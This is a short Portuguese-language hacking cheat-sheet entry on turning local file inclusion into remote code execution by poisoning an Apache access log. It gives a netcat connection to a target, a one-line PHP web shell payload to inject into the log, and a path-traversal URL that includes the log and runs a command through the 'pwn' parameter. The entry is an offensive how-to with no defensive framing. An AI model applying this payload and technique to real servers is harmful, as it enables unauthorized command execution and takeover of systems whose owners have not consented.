# Log Injection (LFI para RCE)

Em alguns casos é possível incluir comandos no log da aplicação que serão executados posteriormente.
Num exemplo prático identificamos que o servidor apache gera logs das conexões, dessa forma podemos enviar nosso payload em PHP realizando uma conexão via netcat.

`nc -v ALVO 80 -C`

Após conexão envie o payload:
`<?php system($_GET['pwn']); ?>`

Agora ao acessar o log, inclua o parâmetro `pwn` criado com o payload anteriormente e envie o comando para o servidor.
``http://www.alvo.com.br/info.php?p=/../../../../var/log/apache2/access.log&pwn=whoami``
